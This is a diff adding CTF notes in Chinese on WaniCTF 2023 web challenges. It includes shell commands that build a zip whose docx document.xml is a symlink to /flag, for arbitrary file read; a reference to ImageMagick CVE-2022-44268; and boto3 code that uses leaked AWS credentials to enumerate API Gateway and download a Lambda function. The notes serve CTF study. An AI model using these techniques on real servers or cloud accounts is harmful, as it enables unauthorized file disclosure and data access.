@@ -1633,3 +1633,58 @@ r = requests.post("http://example.com", headers={
 }, data=generator(), cookies={"whoami": "nobody"})
 print(r.text)
 ```
+203. http [range](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests)字段头.可用于指定下载较大request的哪一部分。https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/64bps
+204. [Extract Service 2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/extract2)
+- 软链接（symlink）也可用于docx文件内部。docx文件内部有个word/document.xml，里面记录着word文档的文字。那么将这个文件替换为软链接，就能在服务器提取文字时读取任意文件。
+```sh
+mkdir word
+cd word
+ln -s /flag document.xml
+cd ../
+7z a exploit.zip word
+```
+205. [certified1](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified1)
+- rust ImageMagick web应用漏洞：[CVE-2022-44268](https://www.metabaseq.com/imagemagick-zero-days/).当处理png时，可能会导致服务器上的任意文件读取。[poc](https://github.com/voidz0r/CVE-2022-44268)
+  - 注意这个漏洞无法读取/proc下的文件，因为/proc下的文件不是真正意义上的文件：https://superuser.com/questions/619955/how-does-proc-work。所以需要配合题目中自带的其他漏洞：[certified2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)
+206. [Lambda](https://hackmd.io/@Solderet/SomeWriteupForWaniCTF2023-XogSiA#Lambda---web)
+- AWS相关考点cheatsheet：https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md
+- 此题给出了AWS相关凭证，要求获取其lambda函数(A lambda function is a piece of code that is executed whenever is triggered by an event from an event source)内容。以下代码获取lambda函数名称：
+```python
+import boto3
+from pprint import pprint
+
+access_key_id = 
+secret_access_key = #key_id和access_key属于凭证内容
+region = #region可以在url里找到。题目发送登陆验证请求时抓包，会看见类似这样的url： https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test 。这个url中ap-northeast-1就是region，k0gh2dp2jg则是API的ID
+
+client = boto3.client(
+    "apigateway",
+    aws_access_key_id=access_key_id,
+    aws_secret_access_key=secret_access_key,
+    region_name=region
+)
+
+restApiId = client.get_rest_apis()['items'][0]['id']
+print("Rest API ID:", restApiId)
+resourceId = client.get_resources(restApiId=restApiId)['items'][0]['id']
+print("Resource ID:", resourceId)
+response = client.get_method(
+    restApiId=restApiId,
+    resourceId=resourceId,
+    httpMethod="GET"
+)
+pprint(response)
+```
+
+获取函数名后就能得到其内容了。
+```python
+client = boto3.client("lambda",
+                      aws_access_key_id=access_key_id,
+                      aws_secret_access_key=secret_access_key,
+                      region_name=region)
+
+response = client.get_function(FunctionName="wani_function")
+
+pprint(response)
+```
+官方[wp](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/lambda)给的是命令行的解法。
